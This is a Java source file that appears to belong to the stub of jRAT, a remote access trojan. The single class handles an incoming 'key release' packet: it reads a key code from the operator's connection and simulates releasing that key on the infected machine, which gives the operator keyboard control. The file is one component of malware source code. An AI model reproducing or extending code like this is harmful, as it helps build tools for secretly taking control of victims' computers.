package se.jrat.stub.packets.incoming;

import se.jrat.common.utils.Utils;
import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();
		
		if (!Utils.isHeadless()) {
			try {
				ScreenUtils.getDefault().keyRelease(btn);
			} catch (IllegalArgumentException e) {

			}
		}
	}

}
